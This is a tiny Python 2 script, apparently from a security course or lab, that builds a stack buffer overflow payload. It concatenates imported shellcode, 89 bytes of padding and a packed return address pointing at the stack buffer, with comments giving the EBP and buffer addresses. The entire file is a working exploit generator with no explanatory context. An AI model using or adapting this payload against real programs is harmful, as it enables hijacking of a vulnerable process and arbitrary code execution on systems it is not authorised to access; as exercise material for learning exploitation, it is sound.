from shellcode import shellcode
from struct import pack


# EBP = 0xbffef238
# BuF = 0xbffef1cc

add = 0xbffef1cc
print shellcode + "X"*89 + pack("<I" , add)
